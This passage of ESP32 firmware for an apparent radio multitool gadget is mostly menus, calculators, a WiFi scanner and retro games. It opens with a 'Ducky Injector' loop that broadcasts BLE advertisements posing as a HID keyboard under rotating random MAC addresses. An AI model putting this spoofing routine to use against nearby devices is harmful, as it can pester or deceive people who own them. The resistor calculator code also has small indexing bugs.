  displayInfo("Ducky Injector", "BLE HID broadcast", "SEL to stop");
  bleInitRadio();
  uint8_t mac[6]; int ch = 37; uint8_t adv[31];
  while (!selPressed()) {
    bleRandomMac(mac);
    int advLen = 0;
    adv[advLen++] = 2; adv[advLen++] = 0x01; adv[advLen++] = 0x06;
    adv[advLen++] = 11; adv[advLen++] = 0x03; adv[advLen++] = 0x19; adv[advLen++] = 0xC1;
    adv[advLen++] = 0x03; adv[advLen++] = 0x03; adv[advLen++] = 0x12; adv[advLen++] = 0x18;
    adv[advLen++] = 0x03; adv[advLen++] = 0x00;
    bleSendPacket(ch, mac, adv, advLen);
    ch = (ch == 37) ? 38 : (ch == 38) ? 39 : 37;
    safeDelay(40);
    yield();
  }
  initRadios();
}

// ============================================================
// TEST RADIOS / SYSTEM INFO
// ============================================================
void runTestRadios() {
  initRadios();
  display.clearDisplay();
  drawHeader("Radio Test");
  display.setCursor(0, 14); display.print("R1: "); display.print(radio1Active ? "OK" : "FAIL");
  display.setCursor(0, 26); display.print("R2: "); display.print(radio2Active ? "OK" : "FAIL");
  if (radio1Active) { display.setCursor(0, 38); display.print("R1 ch: "); display.print(radio.getChannel()); }
  if (radio2Active) { display.setCursor(0, 50); display.print("R2 ch: "); display.print(radio2.getChannel()); }
  display.display();
  while (!selPressed()) yield();
  currentState = STATE_MENU;
}

void runSystemInfo() {
  int page = 0;
  const int totalPages = 3;
  while (!gameShouldExit()) {
    display.clearDisplay();
    if (page == 0) {
      drawHeader("Sys Info [1/3] CPU");
      display.setCursor(2, 13);
      display.print("Model: "); display.print(ESP.getChipModel());
      display.setCursor(2, 23);
      display.print("Freq : "); display.print(ESP.getCpuFreqMHz()); display.print(" MHz (1 Core)");
      display.setCursor(2, 33);
      uint32_t freeH = ESP.getFreeHeap() / 1024;
      display.print("Heap : "); display.print(freeH); display.print(" KB free");
      display.drawRect(2, 43, 122, 6, SSD1306_WHITE);
      int barW = constrain(freeH * 118 / 380, 2, 118);
      display.fillRect(4, 45, barW, 2, SSD1306_WHITE);
      display.setCursor(2, 52);
      display.print("Flash: "); display.print(ESP.getFlashChipSize() / 1048576); display.print("MB QIO 80M");
    } else if (page == 1) {
      drawHeader("Sys Info [2/3] RF");
      display.setCursor(2, 13);
      display.print("NRF #1: ");
      display.print(radio1Active ? "ONLINE (+20dBm)" : "OFFLINE / N/A");
      display.setCursor(2, 23);
      display.print("NRF #2: ");
      display.print(radio2Active ? "ONLINE (+20dBm)" : "OFFLINE / N/A");
      display.setCursor(2, 33);
      display.print("SPI   : SCK:4 MISO:5 MOSI:6");
      display.setCursor(2, 43);
      display.print("Radio1 Pins: CE:20 CSN:21");
      display.setCursor(2, 53);
      display.print("Radio2 Pins: CE:7  CSN:10");
    } else {
      drawHeader("Sys Info [3/3] PWR");
      unsigned long sec = millis() / 1000;
      int hrs = sec / 3600;
      int mins = (sec % 3600) / 60;
      int s = sec % 60;
      display.setCursor(2, 13);
      display.print("Uptime  : ");
      if (hrs < 10) display.print("0"); display.print(hrs); display.print(":");
      if (mins < 10) display.print("0"); display.print(mins); display.print(":");
      if (s < 10) display.print("0"); display.print(s);
      display.setCursor(2, 24);
      display.print("Bright  : "); display.print(brightness); display.print("/255");
      display.setCursor(2, 35);
      display.print("Stealth : "); display.print(stealthMode ? "ACTIVE (Silent)" : "OFF (LED on)");
      display.setCursor(2, 46);
      display.print("Buttons : UP:2 DN:0 SEL:1");
      display.setCursor(2, 56);
      display.print("Hold SEL 5s: Exit");
    }
    drawExitProgress();
    display.display();

    if (upPressed()) {
      page = (page == 0) ? totalPages - 1 : page - 1;
      safeDelay(120);
    } else if (downPressed()) {
      page = (page + 1) % totalPages;
      safeDelay(120);
    }
    safeDelay(20);
  }
  currentState = STATE_MENU;
}

// ============================================================
// CALCULATOR
// ============================================================
void runCalculator() {
  int num1 = 0, num2 = 0;
  char op = '+';
  int cursor = 0;
  while (!selPressed()) {
    display.clearDisplay();
    drawHeader("Calculator");
    display.setCursor(0, 16);
    display.print(cursor == 0 ? ">" : " "); display.print(num1);
    display.print(' '); display.print(op); display.print(' ');
    display.print(cursor == 2 ? ">" : " "); display.print(num2);
    if (cursor == 3) {
      display.setCursor(0, 32); display.print("= ");
      switch (op) {
        case '+': display.print(num1 + num2); break;
        case '-': display.print(num1 - num2); break;
        case '*': display.print(num1 * num2); break;
        case '/': display.print(num2 ? num1 / num2 : 0); break;
      }
    }
    display.setCursor(0, 50); display.print("UP/DN chg SEL next");
    display.display();
    if (upPressed()) {
      if (cursor == 0) num1++;
      else if (cursor == 2) num2++;
      else if (cursor == 1) op = (op == '+' ? '-' : op == '-' ? '*' : op == '*' ? '/' : '+');
    }
    if (downPressed()) {
      if (cursor == 0) num1--;
      else if (cursor == 2) num2--;
      else if (cursor == 1) op = (op == '+' ? '/' : op == '/' ? '*' : op == '*' ? '-' : '+');
    }
    if (selPressed()) { cursor = (cursor + 1) % 4; if (cursor == 3) safeDelay(200); }
    yield();
  }
  currentState = STATE_MENU;
}

// ============================================================
// RESISTOR CALCULATOR
// ============================================================
const char resistorColors[10][8] = {"Black","Brown","Red","Orange","Yellow","Green","Blue","Violet","Gray","White"};
const long multiplierTable[10] = {1,10,100,1000,10000,100000,1000000,10000000,100000000,1000000000};

void runResistorCalc() {
  int bands = 4;
  int band[4] = {0,0,0,1};
  int selBand = 0;
  int numDigits = 2;
  while (!selPressed()) {
    long val = (bands == 4) ? (band[0]*10 + band[1]) * multiplierTable[band[2]]
                            : (band[0]*100 + band[1]*10 + band[2]) * multiplierTable[band[3]];
    String tolStr = (band[bands-1] == 1 ? "1%" : (band[bands-1] == 2 ? "2%" : "0.5%"));
    display.clearDisplay();
    drawHeader("Resistor Calc");
    display.setCursor(0, 14); display.print(val); display.print(" Ohm "); display.print(tolStr);
    int idx = selBand;
    display.setCursor(0, 30);
    if (idx < numDigits) { display.print("Digit "); display.print(idx+1); display.print(": "); display.print(resistorColors[band[idx]]); }
    else if (idx == numDigits) { display.print("Mult: "); display.print(resistorColors[band[numDigits]]); }
    else { display.print("Tol: "); display.print(resistorColors[band[bands-1]]); }
    display.setCursor(0, 50); display.print("Bands: "); display.print(bands);
    display.display();
    if (upPressed()) band[idx] = (band[idx] + 1) % 10;
    if (downPressed()) band[idx] = (band[idx] + 9) % 10;
    if (selPressed()) {
      selBand = (selBand + 1) % (bands);
      if (selBand == 0) bands = (bands == 4) ? 5 : 4;
    }
    yield();
  }
  currentState = STATE_MENU;
}

// ============================================================
// WIFI MONITOR
// ============================================================
void runWiFiMonitor() {
  stopRadios();
  WiFi.mode(WIFI_STA); WiFi.disconnect();
  displayInfo("WiFi Monitor", "SEL to exit");
  while (!selPressed()) {
    int n = WiFi.scanNetworks();
    display.clearDisplay();
    drawHeader("WiFi Monitor");
    display.setCursor(0, 12); display.print("APs: "); display.print(min(n, 5));
    for (int i = 0; i < min(n, 5); i++) {
      int rssi = WiFi.RSSI(i);
      int bar = map(rssi, -100, -30, 0, 60);
      display.fillRect(60, 12 + i * 10, bar, 6, SSD1306_WHITE);
      display.setCursor(0, 12 + i * 10); display.print(WiFi.SSID(i).substring(0, 9));
    }
    display.display();
    WiFi.scanDelete();
    safeDelay(1800);
    yield();
  }
  recoverFromWiFi();
}

// ============================================================
// GAMES (ULTIMATE RETRO ENGINE: 30 FPS, DOOM 3D & 3-BUTTON PRO)
// ============================================================

// (Global exit tracker defined in Helpers)

// ============================================================
// 1. DOOM 3D (RAYCASTER DELUXE: MINIMAP, CANAVARLAR & SHOTGUN)
// ============================================================
static const uint8_t PROGMEM doomMap[16][16] = {
  {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1},
  {1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1},
  {1,0,1,1,0,1,1,0,0,1,1,0,1,1,0,1},
  {1,0,1,0,0,0,1,0,0,1,0,0,0,1,0,1},
  {1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1},
  {1,0,1,0,0,1,1,0,0,1,1,0,0,1,0,1},
  {1,0,1,0,0,0,0,0,0,0,0,0,0,1,0,1},
  {1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1},
  {1,0,1,0,0,1,0,0,0,0,1,0,0,1,0,1},
  {1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1},
  {1,0,1,1,0,1,0,0,0,0,1,0,1,1,0,1},
  {1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1},
  {1,0,0,1,0,0,1,0,0,1,0,0,1,0,0,1},
  {1,0,0,1,0,0,0,0,0,0,0,0,1,0,0,1},
  {1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1},
  {1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1}
};

// ============================================================
// COMPLETE 10-GAME ARCADE ENGINE (v5.3 DELUXE)
// 30 FPS TIMESTEP | 3-BUTTON OPTIMIZED | EEPROM/NVS HIGH SCORES
// ============================================================

struct DoomEnemy {
  float x, y;
  int hp;
  bool alive;
  int type; // 0=Imp, 1=Cacodemon
};

// ------------------------------------------------------------
// 1. DOOM 3D RAYCASTER
// ------------------------------------------------------------
void runDOOM() {
  float posX = 3.5, posY = 3.5;
  float angle = 0.0;
  int playerHP = 100;
  int kills = 0;
  int ammo = 8;
  int reloadTimer = 0;
  int muzzleFlash = 0;
  int gunRecoil = 0;
  int highScore = prefs.getInt("hi_doom", 0);
  
  float medkitX = 7.5, medkitY = 4.5;
  bool medkitActive = true;
  unsigned long lastMedkitRespawn = millis();

  DoomEnemy enemies[2] = {
    {6.5, 6.5, 30, true, 0},
    {10.5, 3.5, 40, true, 1}
  };
  
  displayInfo("DOOM 3D", "UP:Go  DN:Turn", "SEL:Fire (8 Ammo)");
  safeDelay(1200);

  const float FOV = 1.05;
  const int NUM_RAYS = 64;
  float depthBuffer[NUM_RAYS];

  while (playerHP > 0) {
    unsigned long frameStart = millis();

    if (checkGameExit()) {
      currentState = STATE_MENU;
      return;
    }

    if (upPressed()) {
      float nextX = posX + cos(angle) * 0.38;
      float nextY = posY + sin(angle) * 0.38;
      if (nextX >= 0 && nextX < 16 && nextY >= 0 && nextY < 16) {
        if (pgm_read_byte(&doomMap[(int)nextY][(int)nextX]) == 0) {
          posX = nextX;
          posY = nextY;
        }
      }
    }
    if (downPressed()) {
      angle += 0.22;
      if (angle >= 6.28318) angle -= 6.28318;
    }

    bool shotFired = false;
    if (reloadTimer > 0) {
      reloadTimer--;
      if (reloadTimer == 0) ammo = 8;
    } else if (selPressed()) {
      if (ammo > 0) {
        ammo--;
        muzzleFlash = 3;
        gunRecoil = 4;
        shotFired = true;
        if (!stealthMode) digitalWrite(LED_PIN, HIGH);
        if (ammo == 0) reloadTimer = 35;
      } else {
        reloadTimer = 35;
      }
    }
    if (muzzleFlash > 0) muzzleFlash--;
    if (gunRecoil > 0) gunRecoil--;

    if (medkitActive) {
      float mdx = posX - medkitX;
      float mdy = posY - medkitY;
      if (sqrt(mdx * mdx + mdy * mdy) < 0.85) {
        playerHP = min(100, playerHP + 35);
        medkitActive = false;
        lastMedkitRespawn = millis();
        if (!stealthMode) { digitalWrite(LED_PIN, HIGH); safeDelay(25); digitalWrite(LED_PIN, LOW); }
      }
    } else if (millis() - lastMedkitRespawn > 25000) {
      medkitActive = true;
      medkitX = random(2, 14) + 0.5;
      medkitY = random(2, 14) + 0.5;
    }

    for (int i = 0; i < 2; i++) {
      if (enemies[i].alive) {
        float edx = posX - enemies[i].x;
        float edy = posY - enemies[i].y;
        float edist = sqrt(edx * edx + edy * edy);
        
        if (edist > 0.75) {
          float spd = (enemies[i].type == 1) ? 0.055 : 0.040;
          float stepX = (edx / edist) * spd;
          float stepY = (edy / edist) * spd;
          float nex = enemies[i].x + stepX;
          float ney = enemies[i].y + stepY;
          if (nex >= 0 && nex < 16 && ney >= 0 && ney < 16) {
            if (pgm_read_byte(&doomMap[(int)ney][(int)nex]) == 0) {
              enemies[i].x = nex;
              enemies[i].y = ney;
            }
          }
        } else {
          playerHP -= (enemies[i].type == 1 ? 4 : 2);
          if (playerHP < 0) playerHP = 0;
        }

        if (shotFired) {
          float eAngle = atan2(enemies[i].y - posY, enemies[i].x - posX) - angle;
          while (eAngle < -3.14159) eAngle += 6.28318;
          while (eAngle > 3.14159) eAngle -= 6.28318;

          if (fabs(eAngle) < 0.32 && edist < 8.5) {
            enemies[i].hp -= 25;
            if (enemies[i].hp <= 0) {
              enemies[i].alive = false;
              kills++;
              if (kills > highScore) {
                highScore = kills;
                prefs.putInt("hi_doom", highScore);
              }
            }
          }
        }
      } else {
        if (random(0, 35) == 0) {
          int rx = random(1, 15);
          int ry = random(1, 15);
          if (pgm_read_byte(&doomMap[ry][rx]) == 0) {
            enemies[i].x = rx + 0.5;
            enemies[i].y = ry + 0.5;
            enemies[i].hp = (enemies[i].type == 1 ? 40 : 30);
            enemies[i].alive = true;
          }
        }
      }
    }

    display.clearDisplay();

    for (int r = 0; r < NUM_RAYS; r++) {
      float rayAngle = (angle - FOV / 2.0) + ((float)r / (float)NUM_RAYS) * FOV;
      float dist = 0.0;
      bool hit = false;
      float eyeX = cos(rayAngle);
      float eyeY = sin(rayAngle);

      while (!hit && dist < 14.0) {
        dist += 0.12;
        int checkX = (int)(posX + eyeX * dist);
        int checkY = (int)(posY + eyeY * dist);

        if (checkX < 0 || checkX >= 16 || checkY < 0 || checkY >= 16) {
          hit = true; dist = 14.0;
        } else if (pgm_read_byte(&doomMap[checkY][checkX]) > 0) {
          hit = true;
        }
      }

      float correctedDist = dist * cos(rayAngle - angle);
      if (correctedDist < 0.2) correctedDist = 0.2;
      depthBuffer[r] = correctedDist;

      int wallH = (int)(28.0 / correctedDist);
      if (wallH > 44) wallH = 44;

      int wallTop = 32 - wallH / 2;
      int wallBot = 32 + wallH / 2;
      int screenX = r * 2;

      if (correctedDist < 4.0) {
        display.fillRect(screenX, wallTop, 2, wallH, SSD1306_WHITE);
      } else if (correctedDist < 8.0) {
        for (int y = wallTop; y <= wallBot; y += 2) {
          display.drawPixel(screenX, y, SSD1306_WHITE);
          display.drawPixel(screenX + 1, y + 1, SSD1306_WHITE);
        }
      } else {
        display.drawFastVLine(screenX, wallTop, wallH, SSD1306_WHITE);
      }
    }

    if (medkitActive) {
      float mdx = medkitX - posX;
      float mdy = medkitY - posY;
      float mAngle = atan2(mdy, mdx) - angle;
      while (mAngle < -3.14159) mAngle += 6.28318;
      while (mAngle > 3.14159) mAngle -= 6.28318;
      float mDist = sqrt(mdx * mdx + mdy * mdy);

      if (fabs(mAngle) < (FOV / 1.7) && mDist > 0.4 && mDist < 10.0) {
        int mScreenX = (int)((NUM_RAYS / 2) + tan(mAngle) * (NUM_RAYS / 2)) * 2;
        int mRay = constrain(mScreenX / 2, 0, NUM_RAYS - 1);
        if (mDist < depthBuffer[mRay]) {
          int mSize = constrain((int)(16.0 / mDist), 4, 14);
          int mTop = 34 - mSize / 2;
          display.drawRect(mScreenX - mSize/2, mTop, mSize, mSize, SSD1306_WHITE);
          display.drawFastHLine(mScreenX - mSize/4, mTop + mSize/2, mSize/2, SSD1306_WHITE);
          display.drawFastVLine(mScreenX, mTop + mSize/4, mSize/2, SSD1306_WHITE);
        }
      }
    }

    for (int i = 0; i < 2; i++) {
      if (enemies[i].alive) {
        float edx = enemies[i].x - posX;
        float edy = enemies[i].y - posY;
        float eAngle = atan2(edy, edx) - angle;
        while (eAngle < -3.14159) eAngle += 6.28318;
        while (eAngle > 3.14159) eAngle -= 6.28318;

        float edist = sqrt(edx * edx + edy * edy);
        if (fabs(eAngle) < (FOV / 1.7) && edist > 0.4 && edist < 12.0) {
          int eScreenX = (int)((NUM_RAYS / 2) + tan(eAngle) * (NUM_RAYS / 2)) * 2;
          int eRay = constrain(eScreenX / 2, 0, NUM_RAYS - 1);

          if (edist < depthBuffer[eRay]) {
            int eSize = (int)(22.0 / edist);
            if (eSize > 24) eSize = 24;
            if (eSize < 4) eSize = 4;
            int eTop = 32 - eSize / 2;

            if (enemies[i].type == 0) {
              display.fillRect(eScreenX - eSize / 2, eTop, eSize, eSize, SSD1306_WHITE);
              display.drawPixel(eScreenX - 2, eTop + 2, SSD1306_BLACK);
              display.drawPixel(eScreenX + 2, eTop + 2, SSD1306_BLACK);
            } else {
              display.drawCircle(eScreenX, 32, eSize / 2, SSD1306_WHITE);
              display.drawPixel(eScreenX, 32, SSD1306_WHITE);
            }

            int hpW = map(constrain(enemies[i].hp, 0, 40), 0, 40, 0, eSize);
            display.drawFastHLine(eScreenX - eSize / 2, eTop - 3, hpW, SSD1306_WHITE);
          }
        }
      }
    }

    int gunY = 48 + gunRecoil;
    display.fillRect(58, gunY, 12, 16, SSD1306_WHITE);
    display.fillRect(62, gunY - 6, 4, 8, SSD1306_WHITE);
    display.drawFastHLine(56, 63, 16, SSD1306_WHITE);
    display.drawPixel(64, 30, SSD1306_WHITE);
    display.drawFastHLine(61, 30, 2, SSD1306_WHITE);
    display.drawFastHLine(66, 30, 2, SSD1306_WHITE);
    display.drawFastVLine(64, 27, 2, SSD1306_WHITE);
    display.drawFastVLine(64, 32, 2, SSD1306_WHITE);

    if (muzzleFlash > 0) {
      display.fillCircle(64, gunY - 8, 8, SSD1306_WHITE);
      display.fillCircle(64, gunY - 8, 4, SSD1306_BLACK);
    }

    display.fillRect(0, 0, 128, 10, SSD1306_WHITE);
    display.setTextColor(SSD1306_BLACK);
    display.setCursor(2, 1);
    display.print("HP:"); display.print(playerHP);
    display.setCursor(44, 1);
    if (reloadTimer > 0) display.print("RELOAD");
    else { display.print("SH:"); display.print(ammo); display.print("/8"); }
    display.setCursor(92, 1);
    display.print("K:"); display.print(kills);
    display.setTextColor(SSD1306_WHITE);

    drawExitProgress();
    display.display();

    unsigned long elapsed = millis() - frameStart;
    if (elapsed < 33) safeDelay(33 - elapsed);
    yield();
  }

  display.clearDisplay();
  drawHeader("YOU DIED");
  display.setCursor(18, 20); display.print("Kills: "); display.print(kills);
  display.setCursor(18, 30); display.print("Record: "); display.print(highScore);
  if (kills > 0 && kills == highScore) {
    display.setCursor(12, 40); display.print("* NEW HIGH SCORE! *");
  }
  display.setCursor(14, 52); display.print("UP: Play  HOLD: Exit");
  display.display();
  while (!checkGameExit()) {
    if (upPressed()) { runDOOM(); return; }
    yield();
  }
  currentState = STATE_MENU;
}

// ------------------------------------------------------------
// 2. DINO RUN LUXE
// ------------------------------------------------------------
void runDinoGame() {
  int dinoY = 44;
  int jumpVel = 0;
  bool isDucking = false;
  int obsX = 128;
  int obsType = 0;
  int score = 0;
  int highScore = prefs.getInt("hi_dino", 0);
  int frameCount = 0;
  bool inverted = false;

  displayInfo("Dino Run", "UP:Jump  DN:Duck", "SEL:Jump  Hold:Exit");
  safeDelay(1200);

  bool alive = true;
  while (true) {
    unsigned long frameStart = millis();

    if (checkGameExit()) {
      currentState = STATE_MENU;
      return;
    }

    if (alive) {
      if ((upPressed() || selPressed()) && dinoY >= 44 && !isDucking) {
        jumpVel = -9;
      }
      isDucking = (digitalRead(DOWN_BUTTON_PIN) == LOW && dinoY >= 44);

      dinoY += jumpVel;
      jumpVel += 1;
      if (dinoY >= 44) {
        dinoY = 44;
        jumpVel = 0;
      }

      inverted = ((score % 150) >= 100);

      int speed = 4 + min(4, score / 40);
      obsX -= speed;
      if (obsX < -14) {
        obsX = 128 + random(0, 30);
        obsType = random(0, 3);
        score++;
        if (score > highScore) {
          highScore = score;
          prefs.putInt("hi_dino", highScore);
        }
      }

      int obsY = (obsType == 2) ? 34 : 44;
      int obsW = (obsType == 1) ? 6 : 9;
      int obsH = (obsType == 1) ? 14 : 10;
      if (obsType == 2) { obsW = 11; obsH = 7; }

      int dinoH = isDucking ? 5 : 10;
      int dinoTop = isDucking ? 49 : dinoY;

      if (obsX < 24 && obsX + obsW > 14) {
        if (dinoTop + dinoH > obsY && dinoTop < obsY + obsH) {
          alive = false;
        }
      }

      display.clearDisplay();
      if (inverted) display.fillRect(0, 0, 128, 64, SSD1306_WHITE);
      uint16_t fg = inverted ? SSD1306_BLACK : SSD1306_WHITE;

      display.setTextColor(fg);
      display.setCursor(0, 11);
      display.print("S:"); display.print(score);
      display.setCursor(70, 11);
      display.print("HI:"); display.print(highScore);

      int cloud1 = (140 - (frameCount / 2) % 160) - 20;
      display.drawFastHLine(cloud1, 16, 12, fg);
      display.drawFastHLine(cloud1 + 2, 14, 8, fg);

      display.drawFastHLine(0, 54, 128, fg);
      for (int i = 0; i < 128; i += 16) {
        display.drawPixel((i - (frameCount * 3) % 16 + 16) % 128, 57, fg);
      }

      if (isDucking) {
        display.fillRect(14, 49, 14, 5, fg);
        display.fillRect(24, 47, 4, 3, fg);
      } else {
        display.fillRect(16, dinoY, 8, 10, fg);
        display.fillRect(20, dinoY - 3, 6, 5, fg);
        if (dinoY >= 44) {
          if ((frameCount / 3) % 2 == 0) display.drawFastVLine(17, 54, 2, fg);
          else display.drawFastVLine(22, 54, 2, fg);
        }
      }

      if (obsType == 0) {
        display.fillRect(obsX, 46, 6, 8, fg);
        display.drawFastHLine(obsX - 1, 48, 8, fg);
      } else if (obsType == 1) {
        display.fillRect(obsX, 40, 6, 14, fg);
        display.drawFastHLine(obsX - 2, 44, 10, fg);
      } else {
        display.fillRect(obsX, 34, 9, 5, fg);
        if ((frameCount / 4) % 2 == 0) display.drawFastHLine(obsX + 2, 31, 6, fg);
        else display.drawFastHLine(obsX + 2, 40, 6, fg);
      }

      drawExitProgress();
      display.display();
      frameCount++;
    } else {
      display.clearDisplay();
      drawHeader("GAME OVER");
      display.setCursor(20, 20); display.print("Score: "); display.print(score);
      display.setCursor(20, 30); display.print("High:  "); display.print(highScore);
      if (score > 0 && score == highScore) {
        display.setCursor(12, 40); display.print("* NEW HIGH SCORE! *");
      }
      display.setCursor(14, 52); display.print("UP: Retry  HOLD: Exit");
      drawExitProgress();
      display.display();

      if (upPressed()) {
        alive = true;
        dinoY = 44;
        jumpVel = 0;
        obsX = 128;
        score = 0;
        safeDelay(200);
      }
    }

    unsigned long elapsed = millis() - frameStart;
    if (elapsed < 33) safeDelay(33 - elapsed);
    yield();
  }
  currentState = STATE_MENU;
}

// ------------------------------------------------------------
// 3. FLAPPY BIRD DELUXE
// ------------------------------------------------------------
void runFlappyGame() {
  float birdY = 28.0;
  float birdVel = 0.0;
  int pipeX = 128;
  int gapY = random(16, 38);
  int gapSize = 22;
  int coinX = -1, coinY = -1;
  int score = 0;
  int highScore = prefs.getInt("hi_flap", 0);
  bool alive = true;

  displayInfo("Flappy Bird", "UP/SEL:Flap DN:Dive", "Hold SEL 5s: Exit");
  safeDelay(1200);

  while (true) {
    unsigned long frameStart = millis();

    if (checkGameExit()) {
      currentState = STATE_MENU;
      return;
    }

    if (alive) {
      if (upPressed() || selPressed()) {
        birdVel = -3.8;
      }
      if (downPressed()) {
        birdVel += 1.8;
      }

      birdVel += 0.32;
      if (birdVel > 4.5) birdVel = 4.5;
      birdY += birdVel;

      pipeX -= 2;
      if (pipeX < -12) {
        pipeX = 128;
        gapY = random(14, 38);
        score++;
        if (score > highScore) {
          highScore = score;
          prefs.putInt("hi_flap", highScore);
        }
        if (random(0, 2) == 0) {
          coinX = pipeX + 16;
          coinY = gapY + gapSize / 2;
        }
      }

      if (coinX >= 0) {
        coinX -= 2;
        if (abs(coinX - 17) < 8 && abs(coinY - (int)birdY) < 8) {
          score += 5;
          coinX = -1;
          if (score > highScore) {
            highScore = score;
            prefs.putInt("hi_flap", highScore);
          }
        }
      }

      if (birdY < 10 || birdY > 58) {
        alive = false;
      }

      if (pipeX < 24 && pipeX + 12 > 14) {
        if (birdY < gapY || birdY + 5 > gapY + gapSize) {
          alive = false;
        }
      }

      display.clearDisplay();
      drawHeader("Flappy Bird");
      display.setCursor(0, 11); display.print("S:"); display.print(score);
      display.setCursor(75, 11); display.print("HI:"); display.print(highScore);

      display.fillRect(pipeX, 10, 10, gapY - 10, SSD1306_WHITE);
      display.drawRect(pipeX - 1, gapY - 3, 12, 3, SSD1306_WHITE);
      display.fillRect(pipeX, gapY + gapSize, 10, 64 - (gapY + gapSize), SSD1306_WHITE);
      display.drawRect(pipeX - 1, gapY + gapSize, 12, 3, SSD1306_WHITE);

      if (coinX >= 0) {
        display.drawCircle(coinX, coinY, 3, SSD1306_WHITE);
        display.drawPixel(coinX, coinY, SSD1306_WHITE);
      }

      int by = (int)birdY;
      display.fillRect(14, by, 7, 5, SSD1306_WHITE);
      display.drawPixel(19, by + 1, SSD1306_BLACK);
      display.drawPixel(21, by + 2, SSD1306_WHITE);
      if (birdVel < 0) display.drawFastHLine(12, by + 4, 3, SSD1306_WHITE);
      else display.drawFastHLine(12, by + 1, 3, SSD1306_WHITE);

      drawExitProgress();
      display.display();
    } else {
      display.clearDisplay();
      drawHeader("GAME OVER");
      display.setCursor(20, 20); display.print("Score: "); display.print(score);
      display.setCursor(20, 30); display.print("High:  "); display.print(highScore);
      if (score > 0 && score == highScore) {
        display.setCursor(12, 40); display.print("* NEW HIGH SCORE! *");
      }
      display.setCursor(14, 52); display.print("UP: Retry  HOLD: Exit");
      drawExitProgress();
      display.display();

      if (upPressed()) {
        alive = true;
        birdY = 28.0;
        birdVel = 0.0;
        pipeX = 128;
        coinX = -1;
        score = 0;
        safeDelay(200);
      }
    }

    unsigned long elapsed = millis() - frameStart;
    if (elapsed < 33) safeDelay(33 - elapsed);
    yield();
  }
  currentState = STATE_MENU;
}
void runFlappyBird() { runFlappyGame(); }

// ------------------------------------------------------------
// 4. SNAKE TURBO
// ------------------------------------------------------------
void runSnakeGame() {
  const int gw = 32, gh = 14;
  int sx[180], sy[180];
  int len = 3;
  int dir = 1;
  int fx = 16, fy = 7;
  int goldX = -1, goldY = -1;
  int goldTimer = 0;
  bool turbo = false;
  bool alive = true;
  int score = 0;
  int highScore = prefs.getInt("hi_snk", 0);

  for (int i = 0; i < len; i++) {
    sx[i] = 10 - i;
    sy[i] = 7;
  }

  auto spawnFood = [&]() {
    bool coll;
    do {
      fx = random(1, gw - 1);
      fy = random(1, gh - 1);
      coll = false;
      for (int i = 0; i < len; i++) {
        if (sx[i] == fx && sy[i] == fy) coll = true;
      }
    } while (coll);
  };
  spawnFood();

  displayInfo("Snake", "UP:Turn L  DN:Turn R", "SEL:Turbo  Hold:Exit");
  safeDelay(1200);

  unsigned long lastStep = millis();
  while (true) {
    if (checkGameExit()) {
      currentState = STATE_MENU;
      return;
    }

    if (alive) {
      if (upPressed())   dir = (dir + 3) % 4;
      if (downPressed()) dir = (dir + 1) % 4;
      turbo = (digitalRead(SELECT_BUTTON_PIN) == LOW);

      int speedMs = turbo ? 45 : max(60, 130 - len * 2);
      if (millis() - lastStep >= speedMs) {
        lastStep = millis();

        int nx = sx[0];
        int ny = sy[0];
        if (dir == 0) ny--;
        else if (dir == 1) nx++;
        else if (dir == 2) ny++;
        else if (dir == 3) nx--;

        if (nx < 0 || nx >= gw || ny < 0 || ny >= gh) alive = false;
        for (int i = 0; i < len; i++) if (sx[i] == nx && sy[i] == ny) alive = false;

        if (alive) {
          for (int i = len; i > 0; i--) {
            sx[i] = sx[i - 1];
            sy[i] = sy[i - 1];
          }
          sx[0] = nx;
          sy[0] = ny;

          if (nx == fx && ny == fy) {
            if (len < 175) len++;
            score += 10;
            if (score > highScore) {
              highScore = score;
              prefs.putInt("hi_snk", highScore);
            }
            spawnFood();
            if (score % 30 == 0 && goldX < 0) {
              goldX = random(2, gw - 2);
              goldY = random(2, gh - 2);
              goldTimer = 60;
            }
          }

          if (goldX >= 0 && nx == goldX && ny == goldY) {
            score += 50;
            if (score > highScore) {
              highScore = score;
              prefs.putInt("hi_snk", highScore);
            }
            goldX = -1;
          }
          if (goldX >= 0) {
            goldTimer--;
            if (goldTimer <= 0) goldX = -1;
          }
        }
      }

      display.clearDisplay();
      display.drawRect(0, 8, 128, 56, SSD1306_WHITE);
      display.setCursor(0, 0); display.print("S:"); display.print(score);
      display.setCursor(45, 0); display.print("HI:"); display.print(highScore);
      if (turbo) { display.setCursor(85, 0); display.print("[TURBO]"); }

      for (int i = 0; i < len; i++) {
        display.fillRect(sx[i] * 4, 8 + sy[i] * 4, 3, 3, SSD1306_WHITE);
      }
      display.fillRect(fx * 4, 8 + fy * 4, 3, 3, SSD1306_WHITE);
      if (goldX >= 0 && (millis() / 150) % 2 == 0) {
        display.drawCircle(goldX * 4 + 2, 8 + goldY * 4 + 2, 3, SSD1306_WHITE);
      }

      drawExitProgress();
      display.display();
    } else {
      display.clearDisplay();
      drawHeader("GAME OVER");
      display.setCursor(20, 20); display.print("Score: "); display.print(score);
      display.setCursor(20, 30); display.print("High:  "); display.print(highScore);
      if (score > 0 && score == highScore) {
        display.setCursor(12, 40); display.print("* NEW HIGH SCORE! *");
      }
      display.setCursor(14, 52); display.print("UP: Retry  HOLD: Exit");
      drawExitProgress();
      display.display();

      if (upPressed()) {
        alive = true;
        len = 3;
        dir = 1;
        score = 0;
        goldX = -1;
        for (int i = 0; i < len; i++) { sx[i] = 10 - i; sy[i] = 7; }
        spawnFood();
        safeDelay(200);
      }
    }
    safeDelay(20);
    yield();
  }
  currentState = STATE_MENU;
}

// ------------------------------------------------------------
// 5. SPACE INVADERS
// ------------------------------------------------------------
void runInvaders() {
  int playerX = 60;
  int bulletX = -1, bulletY = -1;
  int enemyBombX = -1, enemyBombY = -1;
  int ufoX = -1;
  const int NUM_ALIENS = 10;
  int alienX[NUM_ALIENS];
  int alienY[NUM_ALIENS];
  bool alienAlive[NUM_ALIENS];
  int alienDir = 1;
  int alienMoveTimer = 0;
  int score = 0;
  int highScore = prefs.getInt("hi_inv", 0);
  int lives = 3;
  bool alive = true;

  int bunkerHP[3] = {3, 3, 3};
  const int bunkerX[3] = {20, 58, 96};

